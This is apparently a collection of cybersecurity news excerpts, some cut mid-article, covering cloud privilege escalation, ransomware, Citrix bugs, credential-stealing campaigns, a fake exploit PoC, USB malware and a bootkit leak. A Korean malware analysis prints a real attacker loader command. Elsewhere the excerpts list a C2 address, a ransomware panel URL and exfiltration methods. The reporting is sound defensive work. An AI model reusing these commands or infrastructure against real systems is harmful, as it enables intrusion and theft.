This can lead to DOS, data theft and spreading malware to users.\"As we have seen with the SolarWinds and recent 3CX and MOVEit supply chain attacks, this can have far reaching consequences.\"Orca Security's attack takes advantage of the cloudbuild.builds.create permission to escalate privileges and allow attackers to tamper with Google Kubernetes Engine (GKE) docker images using artifactregistry permissions and run code inside the docker container as root.​After Orca Security reported the issue, the Google Security Team implemented a partial fix revoking the logging.privateLogEntries.list permission from the default Cloud Build Service Account, unrelated to Artifact Registry.It is important to note that this measure did not directly address the underlying vulnerability in the Artifact Registry, leaving the privilege escalation vector and the risk of a supply chain attack intact.\"However, Google's fix doesn't revoke the discovered Privilege Escalation (PE) vector. It only limits it - turning it into a design flaw that still leaves organizations vulnerable to the larger supply chain risk,\" Nisimi said.\"It's therefore important that organizations pay close attention to the behavior of the default Google Cloud Build service account.

Internally, the ransomware is named 'sophos_encrypt,' so it has been dubbed SophosEncrypt, with detections already added to ID Ransomware.When executed, the encryptor prompts the affiliate to enter a token associated with the victim that is likely first retrieved from the ransomware management panel.When a token is entered, the encryptor will connect to 179.43.154.137:21119 and verify if the token is valid. Ransomware expert Michael Gillespie found it possible to bypass this verification by disabling your network cards, effectively running the encryptor offline.When a valid token is entered, the encryptor will prompt the ransomware affiliate for additional information to be used when encrypting the device.This information includes a contact email, jabber address, and a 32-character password, which Gillespie says is used as part of the encryption algorithm.The encryptor will then prompt the affiliate to encrypt one file or encrypt the entire device, as shown below.When encrypting files, Gillespie told BleepingComputer that it uses AES256-CBC encryption with PKCS#7 padding.Each encrypted file will have the entered token, the entered email, and the sophos extension appended to a file's name in the format :.[[]].[[]].sophos. This is illustrated below in a test encryption by BleepingComputer.In each folder that a file is encrypted, the ransomware will create a ransom note named information.hta, which is automatically launched when the encryption is finished.This ransom note contains information on what happened to a victim's files and the contact information entered by the affiliate before encrypting the device.The ransomware also has the capability to change the Windows desktop wallpaper, with the current wallpaper boldly displaying the 'Sophos' brand that it is impersonating.To be clear, this wallpaper was created by the threat actors and has no association with the legitimate Sophos cybersecurity company.The encryptor contains numerous references to a Tor site located at http://xnfz2jv5fk6dbvrsxxf3dloi6by3agwtur2fauydd3hwdk4vmm27k7ad.onion.This Tor site is not a negotiation or data leak site but rather what appears to be the affiliate panel for the ransomware-as-a-service operation.Researchers are still analyzing the SophosEncrypt to see if any weaknesses could allow the recovery of files for free.If any weaknesses, or encryption issues, are found, we will publish an update to this article.Update 7/18/23: After publication of our story, Sophos also released a report on the new SophosEncrypt ransomware.According to their report, the ransomware gang's command and control server at 179.43.154.137 is also linked to Cobalt Strike C2 servers used in previous attacks.\"The address has been associated for more than a year with both Cobalt Strike command-and-control and automated attacks that attempt to infect internet-facing computers with cryptomining software.\""

An attacker can exploit it to execute code remotely without authentication.For hackers to leverage the security issue in attacks, the vulnerable appliance must be configured as a gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or as an authentication virtual server (the so-called AAA server).The company notes that NetScaler ADC and NetScaler Gateway version 12.1 have reached the end-of-life stage and customers should upgrade to a newer variant of the product.In the first week of July, someone advertised on a hacker forum a zero-day vulnerability for Citrix ADC. The details are too few to definitely link it to the Citrix security bulletin today but the little clues available appear to point to it.The author of the post said on July 6 that they had a remote code execution zero-day that allegedly worked for versions of Citrix ADC up to 13.1 build 48.47.BleepingComputer also received a tip a while ago that Citrix had learned of a zero-day advertisement on a cybercrime forum and was working on a patch before disclosing the problem.Defenders knowing about the issue said that they expected active exploitations to continue until Citrix released a fix.Organizations can start investigating if they’ve been compromised by looking for web shells that are newer than the last installation date.HTTP error logs may also reveal anomalies that could indicate initial exploitation. Administrators can also check the shell logs for unusual commands that may be used in the post-exploitation phase.The updates also include fixes for two other vulnerabilities identified as CVE-2023-3466 and CVE-2023-3467. Both have a high severity score of 8.3 and 8, respectively.CVE-2023-3466 is a reflected cross-site scripting (XSS) issue that can be exploited if a victim loads in the browser a link from an attacker and the vulnerable appliance is reachable from the same network.Citrix lists CVE-2023-3467 as a vulnerability that allows an attacker to elevate privileges to those of a root administrator (nsroot).Leveraging this flaw requires authenticated access to the NetScaler appliances IP address (NSIP) or a SubNet IP (SNIP) with access to the management interface.At the time of writing, technical details about all three vulnerabilities are not publicly available but organizations with NetScaler ADC and Gateway appliances should prioritize updating them."

However, research is necessary to develop appropriate cybersecurity labeling for these devices."

      "text": " A sophisticated cloud-credential stealing and cryptomining campaign targeting Amazon Web Services (AWS) environments for the past several months has now expanded to Azure and Google Cloud Platform (GCP) as well. And, the tools used in the campaign share considerable overlap with those associated with TeamTNT, a notorious, financially motivated threat actor, researchers have determined.In separate reports highlighting their key takeaways, the firms noted that the attacks targeting Azure and Google's cloud services involve the same core attack scripts that the threat group behind it has been using in the AWS campaign. However, the Azure and GCP capabilities are very nascent and less developed than the AWS tooling, says Alex Delamotte, threat researcher at SentinelOne. \"The actor only implemented the Azure credential collection module in the more recent — June 24 and newer — attacks,\" she says. \"The development has been consistent, and we will likely see more tools emerge over the coming weeks with bespoke automations for these environments, should the attacker find them a valuable investment.\"In that vein, according to SentinelOne and Permiso, the attacker has begun targeting exposed Docker services as of last month, using newly modified shell scripts that are engineered to determine the environment they are in, profile the systems, search for credential files, and exfiltrate them. The scripts also contain a function for collecting environment variable details, likely used to determine if there are any other valuable services on the system to target later, SentineOne researchers said.The attacker's toolset enumerates service environment information regardless of the underlying cloud service provider, Delamotte says. \"The only automation we saw for Azure or GCP was related to credential harvesting. Any follow-on activity is likely hands-on-keyboard.\"They assessed the threat actor was prepping an \"aggressive cloud worm\" designed to deploy in AWS environments, with a goal of facilitating cloud credentials theft, resource hijacking, and the deployment of a backdoor called \"Tsunami.\"Similarly, SentinelOne and Permiso's joint analysis of the evolving threat showed that in addition to the shell scripts from earlier attacks, TeamTNT is now delivering a UPX-packed, Golang-based ELF binary. The binary basically drops and executes another shell script for scanning an attacker-specified range and propagating to other vulnerable targets.This worming propagation mechanism looks for systems responding with a specific Docker version user-agent, Delamotte says. These Docker instances could be hosted through Azure or GCP. \"Other reports note that these actors exploit public-facing Jupyter services, where the same concepts apply,\" Delamotte says, adding that she believes that TeamTNT is currently merely testing its tools in Azure and GCP environment rather than looking to achieve specific objectives on impacted systems.Attacks like the one against AWS environments that Sysdig reported involve the use of known AWS exploitation frameworks, including one called Pacu, Delamotte notes. Orgs using Azure and GCP should assume that attacks against their environments will involve similar frameworks. She advocates that administrators speak with their red teams to understand what attack frameworks work well against these platforms. \"Pacu is a known red team favorite for attacking AWS,\" she says. \"We can expect these actors will adopt other successful exploitation frameworks.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

He used a front company called Stonebridge Resources, but the real players behind the operation are thought to be Moscow-based Serniya Engineering and Sertal LLC (the Serniya Network).The companies are believed to be acting under the direction of Russian intelligence to procure dual-use technologies, in order to help Russia research and develop nuclear and hypersonic weapons, quantum computing and other military applications.The Serniya Network companies were sanctioned by the Treasury February 2022 and described as “instrumental to the Russian Federation’s war machine.”Konoshchenok was stopped by Estonian authorities while trying to cross into Russia with around 35 different types of semiconductors and electronic components, including several export-controlled US items.He’s also been repeatedly stopped by Estonian border officials attempting to smuggle hundreds of thousands of US-made rounds into Russia, including 6.5 mm, 7 mm, .338 and .308 magnum rounds, which are often used by snipers, as well as military-grade .223 rounds.Court documents contain information from electronic communications obtained by the US government in which Konoshchenok identifies himself as an FSB “Colonel,” complete with a photograph wearing his FSB uniform. His fee for the work was allegedly 10% for sanctioned items.If convicted he faces 30 years behind bars."

Reinfection is highly likely if any infected files are left during the disinfection process.Gamaredon's preferred method of initial compromise involves sending victims an archive containing HTM or HTA files that initiate the infection chain.The group heavily relies on PowerShell for document theft and remote command execution, and they may install Anydesk for interactive remote access.To evade detection, Gamaredon continuously adapts to defensive measures, using PowerShell scripts to bypass two-factor authentication and changing IP addresses frequently.The CERT-UA article provides a list of indicators of compromise (IoC) for the effective detection of Gamaredon.It also urges Ukrainian military personnel to install endpoint detection and threat response (EDTR) software to minimize risks, especially for systems outside the protection perimeter, including those using Starlink terminals for Internet access."

      "text": " The Global Leader in Cybersecurity Events & Trainings. Guest accounts in Azure AD (AAD) are meant to provide limited access to corporate resources for external third parties — the idea is to enable collaboration without risking too much exposure. But enterprises may be unknowingly oversharing access to sensitive resources and applications with guests in Azure AD, paving the way for data theft and more.\"From the perspective of the blue team defending an organization, I'm hoping to show that inviting guests carries a lot more risk than they might think,\" he says. \"This is the first research that I'm aware of that shows that guests can actually gain access to data, not just gain an understanding of your directory or something like that.\"Bargury says the potential exposure can be achieved through a two-step process. The first part of his demonstration at Black Hat USA will show how easy it is to take a guest account with default settings — ones that essentially show access to no applications — and, by using a few cheap manipulations that include creating trial licenses and canceling them, give a guest user visibility into the default environment for Power Apps, which exists in that AAD tenant.Once that visibility is established, guest users will then be able to see all of the application connections created in Power Apps that have been marked as \"shared with everyone\" by developers.\"The root cause of the problem I'm showing comes when somebody has created or shared an application using something that Microsoft calls 'share with everyone,'\" Bargury notes. \"And when you share with everyone, you might think that it's shared with everybody in your org, but essentially it means everyone in your AAD tenant, which includes guests.\"In turn, those apps connect to data in the background that could be sensitive.By default, just because a guest account could see those connections doesn't necessarily mean they could use them to get at data, thanks to limitations that Microsoft has created through protections like its Power Platform DLP controls. However, Bargury will demonstrate how he's able to get around those protections as the second step of the attack process.\"Once you are in and you can see the things that have been overshared, you need to be able to use them,\" he says. \"I'm using research that has been done by others that allows me to basically reach out to internal Microsoft APIs with existing user authentication. The reason why I'm able to go through each of these connections and dump the data behind them is because I was able to peel off the front-end APIs for Power Platform and figure out the infrastructure behind them. And I'm essentially just reaching out directly to the infrastructure in terms of the front-end APIs, which means that I can a) circumvent defenses; and b) leave no logs.\"Bargury says his talk will sound the alarm on how severe this problem is and also provide the audience with the tools to get a handle on the risk posed by this exposure. He'll also walk the audience through configurations that they can change to limit the scope of guest access in their AAD environment, and he'll talk about how to detect the manipulations that could lead to this toxic oversharing to guest accounts.\"One of the key things that I'm doing here is using research to gain authentication tokens to those internal APIs,\" he says. \"And that's an event that you can configure AAD to log. If you find that the user, especially guest user, has provisioned for themselves an authentication token to an internal Microsoft API that should not be exposed, then this should be a red flag.\"As a part of the talk Bargury is going to drop a new tool called PowerGuest, an exploratory auditing tool that will help both blue and red teamers understand the true scope of guest access within an AAD tenant.The other important point he'll focus on is that defenders really should start to gain a better understanding of the connections and credentials opened up in their AAD environments through Power Apps.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

These container-creation templates include all of the necessary software code, runtime, libraries, environment variables, and configuration files to easily deploy an application in Docker.The German researchers analyzed 337,171 images from Docker Hub and thousands of private registries and found that roughly 8.5% contain sensitive data such as private keys and API secrets.The study assembled a massive dataset of 1,647,300 layers from 337,171 Docker images, sourcing the latest image versions from each repository when possible.Data analysis using regular expressions to search for specific secrets revealed the exposure of 52,107 valid private keys and 3,158 distinct API secrets in 28,621 Docker images.The above figures were validated by the researchers excluding test keys, example API secrets, and invalid matches.Most of the exposed secrets, 95% for private keys and 90% for API secrets, resided in single-user images, indicating that they were likely unintentionally leaked.The highest impact was on Docker Hub, which had a percentage of secret exposure of 9.0%, while images sourced from private registries exposed secrets at a rate of 6.3%.This difference may indicate that Docker Hub users typically have a poorer understanding of container security than those setting up private repositories.Next, the researchers needed to determine the actual use of the exposed secrets to appreciate the attack surface size.Alarmingly, 22,082 compromised certificates relying on the exposed private keys were found, including 7,546 private CA-signed and 1,060 public CA-signed certificates.The thousand CA-signed certificates are of particular concern, as these certificates are typically used by a large number of users and are universally accepted.At the time of the study, 141 CA-signed certificates were still valid, somewhat lessening the risk.To further determine the use of the exposed secrets in the wild, the researchers used 15-month worth of internet-wide measurements provided by the Censys database and found 275,269 hosts that rely on the compromised keys.These include:This level of exposure highlights a massive problem in container security and an carelessness on the creation of images without first sanitizing them of secrets.Regarding the API exposure, the analysis found that most of the containers (2,920) belong to cloud providers like Amazon AWS, but some pertained to financial services such as Stripe.However, the researchers cited ethical limitations in validating exposed API secrets against their service endpoints, so their use in the wild is unknown."

Lazarus 그룹은 IIS 웹 서버를 공격해 제어를 탈취한 이후 INITECH 취약점 공격에 사용되는 악성코드를 배포하는 목적의 서버로 사용하였다.만약 취약한 버전의 INISAFE CrossWeb EX V3가 설치되어 있는 경우라면 다음 보안 업데이트 권고를 참고하여 제거 후 최신 업데이트를 진행해야 한다.일반적으로 공격자들은 스캐닝 결과 취약한 버전을 갖는 웹 서버가 확인되면 버전에 맞는 취약점을 이용해 웹쉘을 설치하거나 악성 명령을 실행한다. 공격자가 취약점을 이용해 악성 명령을 실행하거나 웹쉘을 이용해 파일 다운로드 / 업로드, 원격 명령 실행과 같은 행위를 할 경우 IIS 웹 서버 프로세스인 w3wp.exe에 의해 악성 행위가 수행된다.이번에 확인된 공격에서는 이전 사례와 유사하게 w3wp.exe 즉 IIS 웹 서버 프로세스에 의해 Lazarus 공격 그룹의 악성코드가 생성된 사례가 확인된다. w3wp.exe 프로세스에 의해 생성된 악성코드 usopriv.exe는 Themida로 패킹된 JuicyPotato 악성코드이다. Potato 악성코드들은 권한 상승 기능을 담당하는 악성코드이며 권한 상승 방식에 따라 JuicyPotato, RottenPotato, SweetPotato 등 다양한 유형들이 존재한다. 공격자들은 웹쉘이나 사전 공격을 통해 해당 프로세스를 제어할 수 있다고 하더라도 w3wp.exe 프로세스가 적절한 권한이 존재하지 않기 때문에 원하는 악성 행위를 수행할 수 없다. 이는 MS-SQL 서버의 sqlservr.exe 프로세스도 동일한데 이러한 문제를 해결하기 위해 공격자들은 공격 과정에서 권한 상승 악성코드들을 함께 사용하는 경향이 있다. 특히 IIS 웹 서버나 MS-SQL 데이터베이스 서버를 대상으로 하는 공격에서는 주로 Potato 권한 상승 악성코드들이 사용된다. Potato는 특정 권한이 활성화된 일부 프로세스들을 악용하는 방식으로 권한을 상승하며, 이후 공격자는 상승된 권한으로 악성 행위를 수행할 수 있다. 다음은 공격자가 감염 시스템에 설치한 JuicyPotato를 이용해 실행한 명령들의 목록이다. 권한 상승이 제대로 이루어졌는지를 확인하기 위해 whoami 명령을 사용하였으며, 실질적으로 악성 행위를 담당하는 Loader 악성코드를 실행한 로그도 함께 확인된다.공격자는 JuicyPotato를 이용해 Loader 악성코드를 실행시켰다. Loader는 DLL 포맷이기 때문에 rundll32를 이용해 실행하였으며 랜덤한 문자열을 인자로 전달하였다.> rundll32 c:\\programdata\\usoshared.dat ,usoprivfunc 4729858204985024133Loader는 먼저 사용할 데이터 파일의 이름을 복호화하여 “{20D1BF68-64EE-489D-9229-95FEFE5F12A4}” 문자열을 구한다. 해당 문자열은 데이터 파일의 이름이며 모두 3개의 경로에서 해당 이름을 갖는 파일을 찾는다. 현재 해당 경로의 파일을 확보되지 못했지만 Loader 악성코드의 루틴을 통해 이 악성코드가 암호화된 데이터 파일을 복호화하여 메모리 상에서 실행시키는 Loader 악성코드라는 사실은 확인 가능하다.만약 위의 경로에 {20D1BF68-64EE-489D-9229-95FEFE5F12A4} 파일이 존재할 경우에는 처음 3바이트를 읽어 “GIF” 문자열인지를 검사한다. 공격자는 데이터 파일을 GIF 그림 파일로 위장한 것으로 추정된다. 동일하다면 다음 4바이트를 읽는데 이는 다음부터 읽어들일 데이터의 사이즈이다.나머지 데이터는 다음과 같은 복호화 루틴을 통해 메모리 상에서 실행되기 때문에 암호화된 실제 PE로 추정된다. 처음에 구한 0xC00 이하의 데이터는 메모리 상에서 PE를 실행할 때 인자로 전달하기 때문에 복호화된 악성코드가 사용할 설정 데이터로 추정된다.일반적으로 Lazarus 그룹은 위와 같이 Loader 악성코드와 암호화된 데이터 파일을 함께 사용하는 경향이 있다. 위와 같이 PE 포맷인 Loader가 특정 경로에 위치한 암호화된 데이터 파일을 메모리 상에서 복호화한 후 실행하는 형태이다. 현재 데이터 파일은 확인되지 않지만 확인된 과거 사례들을 보면 최종적으로 실행되는 악성코드는 대부분 추가 악성코드를 다운로드하는 다운로더거나 공격자의 명령을 전달받아 악성 행위를 수행할 수 있는 백도어이다.자사 AhnLab Smart Defense(ASD) 로그에 따르면 패치되지 않은 과거 버전의 INISAFECrossWebEX를 사용 중인 시스템에 대한 INISAFE 취약점 공격은 지속적으로 진행되고 있다. 이후에도 공격자는 INISAFE 취약점 공격으로 감염 시스템에 추가 악성코드 “SCSKAppLink.dll”를 설치하려고 시도하였으며, “SCSKAppLink.dll”의 다운로드 주소가 위에서 다룬 IIS 웹 서버인 것이 확인되었다. 즉 공격자는 IIS 웹 서버를 공격해 제어를 탈취한 이후 악성코드를 배포하는 서버로 활용하였다.공격자는 최신 버전으로 패치되지 않은 시스템들을 대상으로 최근까지도 취약점 공격을 초기 침투에 사용하고 있다. 만약 최신 버전의 이니텍 제품을 사용하고 있지 않은 경우라면 다음 보안 업데이트 권고를 참고하여 최신 업데이트를 진행해야 한다.또한 V3를 최신 버전으로 업데이트하여 악성코드의 감염을 사전에 차단할 수 있도록 신경 써야 한다.파일 진단– Exploit/Win.JuicyPotato.C5452409 (2023.07.12.03)– Trojan/Win.Loader.C5452411 (2023.07.12.03)행위 진단– InitialAccess/MDP.Event.M4242IOCMD5– 280152dfeb6d3123789138c0a396f30d : JuicyPotato (usopriv.exe)– d0572a2dd4da042f1c64b542e24549d9 : Loader (usoshared.dat)연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구독 서비스를 통해 확인 가능하다.[필수] 개인정보 수집 및 이용 동의Δ[필수] 개인정보 수집 및 이용 동의Δ[…] Security analysts urged users to remain vigilant and deploy an up-to-date patch management system.

      "text": " Reporter, Infosecurity MagazineThis playbook, crafted by the Russian military intelligence service (GRU), contains the following five operational phases:Typically, after an initial reconnaissance, Russian cyber operations since the beginning of the war in Ukraine would start compromising systems with the ‘living on the edge’ phase. Then, the adversary would establish a foothold in the system, maintain its presence and escalate privileges with ‘living off the land’ methods. It would then combine these methods with group policy objects to move laterally and conduct further reconnaissance within the internal systems. Finally, it would deploy the malware (wipers, ransomware…) and launch a Telegram campaign to amplify the operation’s success at the same time.This led Mandiant to confirm the GRU’s “central role in standardizing operations across multiple subteams in an attempt to deliver more repeatable, consistent effects,” the report reads.As most phases aim to deploy and execute disruptive malware quickly while avoiding detection, Mandiant noted that the playbook is “notably suited for a fast-paced and highly contested operating environment, indicating that Russia’s wartime goals have likely guided the GRU’s chosen tactical courses of action.”   The company also assessed “with moderate confidence that this standard concept of operations highly likely represents a deliberate effort to increase the speed, scale and intensity at which the GRU could conduct offensive cyber operations while minimizing the odds of detection.”Dan Black and Gabby Roncone, the report’s authors, also noted that while the general intent of the GRU is aligned with previous Russia-aligned cyber campaigns – “to irreversibly destroy data and disrupt the ability of target systems to function as intended” – the design of the disruptive malware the GRU has chosen to use during the war is substantively different from what was previously observed.First, since the beginning of the war in Ukraine, Russian threat actors have shifted from deploying pure, sometimes pre-packaged, disruptive tools that can be used immediately – but that were usually not reused much – to multifunctional and highly reusable ones.Second, the GRU has extended its use of “noteworthy political actors and hacktivist identities” in its disruptive playbook. From 2014 to 2018, Mandiant saw the emergence of several ‘personas’ (CyberBerkut, CyberCaliphate, Guccifer 2.0…) that allowed the GRU “to misdirect attribution and generate second-order psychological effects from their cyber operations.”Since the beginning of the war in Ukraine, some new, self-proclaimed hacktivist groups have started appearing (CyberArmyofRussia_Reborn, XakNet Team,  Infoccentr…). These took a more active role than the previous category of personas: besides supporting the Russian regime, they actively amplified and exaggerated the impact of the cyber-attacks conducted by Russian hackers, and some were even observed to leak data from victims who were also affected by wiper attacks. All this primarily happened on Telegram, “which has emerged as a critical source of sensemaking, war-related information operations, and a key recruitment platform for volunteer cyber “armies” in the conflict,” wrote Mandiant researchers.One notable example highlighted by Mandiant is the deployment of CaddyWiper in October 2022 by a threat group the cybersecurity firm tracks as UNC3810.The researchers wrote: “In the final stage of the playbook, data from the victim of UNC3810’s wiper attack was staged and advertised on Telegram by ‘CyberArmyofRussia_Reborn,’ […] that claimed responsibility for the wiper attack. However, technical artifacts from the UNC3810’s intrusion indicate that the ‘CyberArmyofRussia_Reborn’ persona severely exaggerated the success of the wiper attack. Due to a series of operator errors, UNC3810 was unable to complete the wiper attack before the Telegram post boasting of the disrupted network. Instead, the Telegram post preceded CADDYWIPER’s execution by 35 minutes, undermining CyberArmyofRussia_Reborn’s repeated claims of independence from the GRU.”In its conclusion, Mandiant said it “anticipates that similar operational approaches, or ‘playbooks,’ may be mirrored in future crises and conflict scenarios where requirements to support high volumes of disruptive cyber operations are present.”"

      "text": " Deputy Editor, Infosecurity MagazineA new version of the Common Vulnerability Scoring System (CVSS 4.0) has been unveiled publicly by the Forum of Incident Response and Security Teams (FIRST) on July 13, 2023.CVSS is the open industry standard for assessing the severity of computer system security vulnerabilities, helping organizations prioritize their vulnerability management processes. It provides a method of capturing the principal characteristics of a vulnerability and producing a numerical score to demonstrate its severity.The numerical score is also represented as a qualitative severity rating: low, medium, high and critical.Version 4.0 is currently undergoing a public preview comment period, which will end on July 31, 2023. All feedback will then be reviewed and addressed by August 31, 2023, with FIRST aiming for an official publication date of October 1, 2023.Commenting on the new version, FIRST’s CEO Chris Gibson said: “The CVSS system has rapidly developed over the past 18 years, with each version building on our capabilities to defend from cyber criminality.“I am immensely proud of the CVSS Special Interest Group (SIG) for the hard work and dedication it has taken to produce version 4.0. And it is timely as we continue to see a significant rise in threats across the world.“As a membership organization, our goal is to empower our members and the sector, demonstrating leadership and ensuring we are dedicated to continuously improving how we work together to defend people across the globe against cyber-attacks.”The first version of the standard (CVSS v1) was introduced in February 2005 by a small group of pioneers, who recognized the need to standardize vulnerability measurements across software and platforms. The non-profit FIRST was appointed in April 2005 to become the custodian of CVSS for future development.Prior to 2005, vendors were forced to use custom, incompatible rating systems to define severity of vulnerabilities.CVSS v1 was tested extensively by over a dozen FIRST members of the CVSS-SIG during 2006 and 2007, leading to the development of v2 in June 2007. This reduced inconsistencies and provided additional granularity alongside other improvements to the original standard.Version 3.0 was published in June 2015, which introduced the concept of ‘scope’ to handle the scoring of vulnerabilities that exist in one software component, but impact a separate software, hardware or networking component.Finally, 3.1 was released in June 2019 to provide better clarity of concepts to improve the overall ease of use of the standard. However, it did not introduce any new metrics or values."

      "text": " Google is fighting back against the constant invasion of malware on Google Play by requiring all new developer accounts registering as an organization to provide a valid D-U-N-S number before submitting apps.The new measure aims to enhance the platform's security and trustworthiness and is part of the effort to curb malware submissions from new accounts.Typically, malicious apps on Google Play are submitted for review without dangerous code or payloads, which are then fetched later via an update in the post-installation phase.The offending apps are reported and removed from the Play Store, and their developers are banned. However, it is relatively easy for them to create a new account and submit the same dangerous apps under a new name and theme.D-U-N-S is a globally recognized proprietary standard used by the United States government, the European Commission, the United Nations, and Apple, and it's considered trustworthy.By requiring a D-U-N-S number from software developers, Google will make it much harder for publishers of malicious apps to re-register on the app store, as they would have to set up a new company to return to the platform.In addition to the above, Google will change the \"Contact details\" section of app entries on the Play Store, renaming it to \"App support\" and adding more information about the developer.Previously, this section hosted the developer's name, email, and location, but now it will also include the company name, complete office address, website URL, and phone number.This change will enhance transparency, empowering users with a clearer understanding of the company responsible for each app.Google says it will regularly verify information provided by app developers for inclusion in that section.If they find any inconsistencies, they will suspend the account's ability to publish apps on the Play Store, eventually removing existing apps after a specified period."

      "text": " ​Cybersecurity researchers and threat actors are targeted by a fake proof of concept (PoC) CVE-2023-35829 exploit that installs a Linux password-stealing malware.Uptycs analysts discovered the malicious PoC during their routine scans when detection systems flagged irregularities such as unexpected network connections, unauthorized system access attempts, and atypical data transfers.Three repositories were found hosting the malicious fake PoC exploit, with two removed from GitHub and the remaining one still live.Uptycs reports that the bad PoC has been widely shared among members of the security research community, so infections might exist on a significant number of computers.In reality, though, the PoC is a copy of an old, legitimate exploit for another Linux kernel vulnerability, CVE-2022-34918.The code takes advantage of namespaces, a Linux feature that partitions kernel resources, to give the impression that it's a root shell, even though its privileges are still limited within the user namespace.This is done to reinforce the illusion that the exploit is genuine and working as expected, giving the attackers more time to roam freely on the compromised system.Upon launch, the PoC also creates a 'kworker' file and adds its path to the '/etc/bashrc' file for persistence.Next, it contacts the attacker's C2 server to download and execute a Linux bash script from an external URL.The downloaded script accesses the '/etc/passwd' file to steal valuable data from the system, modifies the '~/.ssh/authorized_keys' to grant the attacker unauthorized remote access to the server, and eventually uses curl to exfiltrate data via 'transfer.sh'.The script steals data that includes the username, hostname, and the contents of the victim's home directory. However, as the threat now has remote access to the server, they can steal whatever they want manually.The bash script disguises its operations as kernel-level processes to evade detection, as system administrators tend to trust them and generally don't scrutinize those entries.Uptycs suggests that researchers who downloaded and used the fake PoC perform the following steps:PoCs downloaded from the internet should be tested on sandboxed/isolated environments like virtual machines and, if possible, have their code inspected before execution.Submitting binaries to VirusTotal is also a quick and easy way to identify a malicious file.Using fake PoCs to target researchers and threat actors with malware is not new."

      "text": " What's old is new again, with researchers seeing a threefold increase in malware distributed through USB drives in the first half of 2023Mandiant reports that Sogu is currently the most aggressive USB-assisted cyber-espionage campaign, targeting many industries worldwide and attempting to steal data from infected computers.The victims of Sogu malware are located in the United States, France, the UK, Italy, Poland, Austria, Australia, Switzerland, China, Japan, Ukraine, Singapore, Indonesia, and the Philippines.Most victims belong to the pharmaceutical, IT, energy, communications, health, and logistics sectors, but there are victims across the board.The payload, called 'Korplug,' loads C shellcode (Sogu) into memory via DLL order hijacking, which requires tricking the victim into executing a legitimate file.Sogu establishes persistence by creating a registry Run key and uses Windows Task Scheduler to ensure it runs regularly.Next, the malware drops a batch file onto 'RECYCLE.BIN' that helps with system reconnaissance, scanning the infected machine for MS Office documents, PDFs, and other text files that may contain valuable data.Files found by Sogu are copied to two directories, one on the host's C:\\ drive and one on the working directory on the flash drive, and encrypted using base64.The document files are eventually exfiltrated to the C2 server over TCP or UDP, using HTTP or HTTPS requests.Sogu also supports command execution, file execution, remote desktop, snapping screenshots from the infected computer, setting up a reverse shell, or performing keylogging.Any drives connected to the infected system will automatically receive a copy of Sogu's initial compromise file set to allow lateral movement.Snowydrive is a campaign that infects computers with a backdoor allowing the attackers to execute arbitrary payloads through the Windows command prompt, modify the registry, and perform file and directory actions.In this case, too, the victim is tricked into launching a legitimate-appearing executable on a USB drive, which triggers the extraction and execution of the malware's components that lie in a 'Kaspersky' folder.The components undertake specific roles such as establishing persistence on the breached system, evading detection, dropping a backdoor, and ensuring malware propagation through newly connected USB drives.Snowydrive is a shellcode-based backdoor that is loaded into the process of 'CUZ.exe,' which is a legitimate archive unzip software.The backdoor supports many commands that allow file operations, data exfiltration, reverse shell, command execution, and reconnaissance.For evasion, the malware uses a malicious DLL side-loaded by 'GUP.exe,' a legitimate Notepad++ updater, to hide file extensions and specific files marked with \"system\" or \"hidden.\"While USB attacks require physical access to the target computers to achieve infection, they have unique advantages that keep them both relevant and trending in 2023, as Mandiant reports.The advantages include bypassing security mechanisms, stealth, initial access to corporate networks, and the ability to infect air-gapped systems isolated from unsecured networks for security reasons.Mandiant's investigation point to print shops and hotels as infection hotspots for USB malware. Still, considering the random, opportunistic spread of these backdoors, any system with a USB port could be a target."

      "text": " The source code for the BlackLotus UEFI bootkit has leaked online, allowing greater insight into a malware that has caused great concern among the enterprise, governments, and the cybersecurity community.Its features include impairing the BitLocker data protection feature, the Microsoft Defender Antivirus, and the Hypervisor-protected Code Integrity (HVCI) - also known as the Memory Integrity feature that protects against attempts to exploit the Windows Kernel.Windows Secure Boot is a security feature that blocks untrusted bootloaders on computers with Unified Extensible Firmware Interface (UEFI) firmware and a Trusted Platform Module (TPM) chip. This security feature is meant to prevent rootkits from loading during the startup process and evade detection by applications running in Windows.Bypasses were found for the security update, allowing BlackLotus to continue to operate and forcing Microsoft to play catchup by revoking additional Windows Boot Managers. As Microsoft warned that incorrectly installing the security fix could cause your system not to start or be recoverable from Windows installation media, many decided not to install the update, leaving devices vulnerable to Secure Boot bypass attacks.\"This can prevent you from using recovery media, such as discs or external drives, or network boot recovery, if the media has not been correctly updated.\"However, the threat actor kept the source code private, offering rebuilds for $200 to customers who wanted to customize the bootkit.\"The leaked source code isn't complete and contains mainly the rootkit part and bootkit code to bypass Secure Boot,\" stated Binarly's co-founder and CEO Alex Matrosov.Matrosov explains that the bootkit's techniques are no longer new, but the source code leak makes it trivial for threat actors to combine the bootkit with new bootloader vulnerabilities, either known or unknown.\"Most of these tricks and techniques are previously known for years and don't present significant impact,\" Matrosov told BleepingComputer in a conversation about the leak.\"However, the fact that it's possible to combine them with new exploits like the BlackLotus campaign did was something unexpected to the industry and shows the real limitations of the current mitigations below the operating system.\"It is important to stress that even though Microsoft addressed the Secure Boot bypasses in CVE-2022-21894 and CVE-2023-24932, the security update is optional, and the fixes are disabled by default.To secure systems against the BlackLotus UEFI bootkit threat, make sure to follow the comprehensive mitigation advice that NSA published last month.With the bootkit's source code now widely available, it is also possible that competent malware authors might create more potent variants that can bypass existing and future countermeasures.Matrosov told BleepingComputer that this particular attack vector has significant benefits for attackers and will only get more sophisticated and complex."

